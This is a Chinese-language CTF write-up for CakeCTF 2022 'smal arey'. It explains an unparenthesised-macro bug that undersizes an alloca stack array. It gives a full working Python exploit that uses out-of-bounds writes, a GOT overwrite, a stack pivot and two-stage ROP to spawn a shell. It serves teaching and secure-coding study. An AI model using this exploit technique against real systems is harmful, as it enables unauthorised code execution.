# CakeCTF 2022 smal arey Writeup

## 题目简述

程序只允许申请最多 5 个 `long` 的栈数组，并检查访问下标必须满足 $0\leq index<size$。漏洞藏在两个宏中：

```c
#define ARRAY_SIZE(n) (n * sizeof(long))
#define ARRAY_NEW(n) (long*)alloca(ARRAY_SIZE(n + 1))
```

宏参数 `n` 没有在替换文本中加括号。`ARRAY_NEW(size)` 展开后不是预期的 $(size+1)\times8$，而是：

```c
alloca(size + 1 * sizeof(long))
```

当 `size=5` 时实际只申请 13 字节，程序却允许写入 5 个 `long`，从而覆盖相邻的局部变量。

## 解题过程

### 从合法下标覆盖 size

在题目二进制的栈布局中，过小的 `arr` 后面依次邻接 `size`、`index` 和 `arr` 指针本身。写入 `arr[4]` 虽然通过原检查，却已经越过真实分配范围并覆盖 `size`。

将 `size` 改成足够大的正值后，可以继续使用更大的下标。官方脚本提交超出有符号 `long` 范围的十进制数；目标 glibc 的转换结果放宽了后续边界检查。利用时更重要的是确认目标运行库中的实际落值，而不是机械依赖源码注释中的位模式。

### 改写 arr 指针形成任意写

`arr[6]` 对应保存 `arr` 指针的栈槽。执行：

```text
arr[6] = exit@GOT
```

后，后续 `arr[0] = value` 就会把 `value` 写入 `exit@GOT`。目标没有 PIE 且只有 partial RELRO，因此可以把该 GOT 项改成固定地址的栈迁移 gadget：

```text
add rsp, 8; ret
```

发送非法下标触发 `exit(0)`。PLT 经被改写的 GOT 跳到 gadget，丢弃调用压入的返回地址后，`ret` 从 `alloca` 区域开始取出预先写好的 ROP 链。

### 两阶段 ROP

第一阶段把 `printf@GOT` 当作字符串传给 `printf@PLT`，泄露其中保存的 libc 地址，然后跳回 `_start` 重启交互：

```python
setval(0, pop_rdi)
setval(1, elf.got("printf"))
setval(2, elf.plt("printf"))
setval(3, elf.symbol("_start"))
```

第二阶段使用相同的越界写和栈迁移，执行 `system("/bin/sh")`：

```python
from ptrlib import ELF, Socket, u64

def setval(index, value):
    sock.sendlineafter("index: ", str(index))
    sock.sendlineafter("value: ", str(value))

elf = ELF("chall")
libc = ELF("libc-2.31.so")
sock = Socket("pwn1.2022.cakectf.com", 9002)

def enable_oob_and_pivot(chain):
    for i, value in enumerate(chain):
        setval(i, value)

    # arr[4] 覆盖 size，使 index 6 可以通过检查。
    setval(4, (1 << 64) - 1)
    # arr[6] 覆盖 arr 指针，下一次 arr[0] 写入 exit@GOT。
    setval(6, elf.got("exit"))
    setval(0, next(elf.gadget("add rsp, 8; ret;")))
    sock.sendlineafter("index: ", "-1")

sock.sendlineafter("size: ", "5")
enable_oob_and_pivot([
    next(elf.gadget("pop rdi; ret;")),
    elf.got("printf"),
    elf.plt("printf"),
    elf.symbol("_start"),
])

libc.set_base(u64(sock.recv(6)) - libc.symbol("printf"))

sock.sendlineafter("size: ", "5")
enable_oob_and_pivot([
    next(elf.gadget("pop rdi; ret;")),
    next(libc.search("/bin/sh")),
    libc.symbol("system"),
])

sock.sh()
```

进入 shell 后读取随机后缀的 flag 文件，可得：

```text
CakeCTF{PRE01-C. Use parentheses within macros around parameter names}
```

## 方法总结

漏洞完全来自宏展开优先级。调用者传入表达式 `size + 1` 时，缺少参数括号使乘法只作用于常量 `1`，最终把一个看似有严格下标检查的小数组变成栈越界写。

利用链是：合法下标覆盖 `size`、扩大可访问范围、覆盖数组指针得到任意写、改写 `exit@GOT` 完成栈迁移，最后用两阶段 ROP 泄露 libc 并调用 `system`。宏中每次使用参数都应写成 `(n)`，整个表达式也应完整加括号。
